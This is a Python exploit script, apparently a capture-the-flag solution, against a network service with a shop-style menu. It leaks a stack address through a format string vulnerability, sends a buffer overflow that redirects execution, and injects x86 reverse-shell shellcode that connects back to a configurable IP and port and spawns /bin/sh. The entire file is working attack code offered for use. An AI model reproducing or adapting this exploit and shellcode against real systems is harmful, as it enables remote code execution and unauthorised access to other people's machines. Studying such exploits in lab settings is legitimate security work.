import socket
import sys
import struct
import time
from cStringIO import StringIO

def reverse_shell(ip, port):
    ip = ip.split('.')
    ip = struct.pack('<BBBB', int(ip[0]), int(ip[1]), int(ip[2]), int(ip[3]))
    port = struct.pack('>H', port)

    # Shellcode from: http://shell-storm.org/shellcode/files/shellcode-849.php
    shellcode = bytearray('\x31\xc0\x31\xdb\x31\xc9\x31\xd2'
                          '\xb0\x66\xb3\x01\x51\x6a\x06\x6a'
                          '\x01\x6a\x02\x89\xe1\xcd\x80\x89'
                          '\xc6\xb0\x66\x31\xdb\xb3\x02\x68')
    shellcode.extend(ip)
    shellcode.extend('\x66\x68')
    shellcode.extend(port)
    shellcode.extend('\x66\x53\xfe'
                     '\xc3\x89\xe1\x6a\x10\x51\x56\x89'
                     '\xe1\xcd\x80\x31\xc9\xb1\x03\xfe'
                     '\xc9\xb0\x3f\xcd\x80\x75\xf8\x31'
                     '\xc0\x52\x68\x6e\x2f\x73\x68\x68'
                     '\x2f\x2f\x62\x69\x89\xe3\x52\x53'
                     '\x89\xe1\x52\x89\xe2\xb0\x0b\xcd'
                     '\x80')

    return shellcode

def read_to_prompt(s, prompt=': '):
    data = s.recv(1024)
    while data[len(data) -2:] != prompt:
        data += s.recv(1024)
    return data

def main():
    shellcode = reverse_shell('127.0.0.1', 31337)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((sys.argv[1], int(sys.argv[2])))

    read_to_prompt(s)

    # Exploit format string vulnerability
    print 'sending format string exploit'
    s.send('%22$x\n')

    data = read_to_prompt(s)

    lines = StringIO(data).readlines()
    addr = int(lines[0], 16)

    print 'command buffer addr: 0x%08x' % (addr)
    shellcode_addr = (addr + 0x1000) & 0xfffff000
    print 'expected shellcode addr: 0x%08x' % (shellcode_addr)

    # Buy command
    print 'sending buy command'
    s.send('b\n')
    read_to_prompt(s)

    # Choose assassination
    s.send('4\n')
    print 'buying assassination'
    read_to_prompt(s)

    # Checkout command
    print 'sending checkout command'
    s.send('c\n')
    read_to_prompt(s)

    # Construct overflow
    overflow = 'y\x00'

    while len(overflow) < 0x40:
        overflow += '\x66'

    # Preserve stack data
    overflow += struct.pack('<I', 0x0804a3d0)

    while len(overflow) < 0x5c:
        overflow += '\x77'

    overflow += struct.pack('<I', shellcode_addr)

    # Send overflow
    print 'sending overflow'
    s.send(overflow + '\n')

    read_to_prompt(s, '? ')

    # Send shellcode
    print 'sending shellcode'
    s.send(str(shellcode) + '\n')

    read_to_prompt(s, '? ')

    # Final program input
    print 'sending final input'
    s.send('Nobody\n')

    s.close()
    print 'Pwned!?'

if __name__ == '__main__':
    main()

